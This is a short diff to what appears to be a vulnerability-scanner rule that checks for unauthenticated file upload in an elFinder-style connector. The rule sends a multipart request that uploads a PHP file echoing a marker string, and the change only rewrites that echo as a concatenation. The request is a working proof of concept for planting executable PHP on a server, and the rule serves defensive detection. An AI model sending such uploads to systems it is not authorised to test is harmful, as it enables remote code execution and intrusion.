@@ -57,7 +57,7 @@ actions: {
     headers: [
       { name: "Content-Type" value: "multipart/form-data; boundary=da77a42118180b4af01977b6627ab7ab" }
     ]
-    data: "--da77a42118180b4af01977b6627ab7ab\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--da77a42118180b4af01977b6627ab7ab\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--da77a42118180b4af01977b6627ab7ab\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"{{ payload }}.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"valid_{{ payload }}\";?>\r\n--da77a42118180b4af01977b6627ab7ab--\r\n"
+    data: "--da77a42118180b4af01977b6627ab7ab\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n--da77a42118180b4af01977b6627ab7ab\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n--da77a42118180b4af01977b6627ab7ab\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"{{ payload }}.php\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo \"valid_\" . \"{{ payload }}\";?>\r\n--da77a42118180b4af01977b6627ab7ab--\r\n"
     response: {
       http_status: 200
       expect_all:{
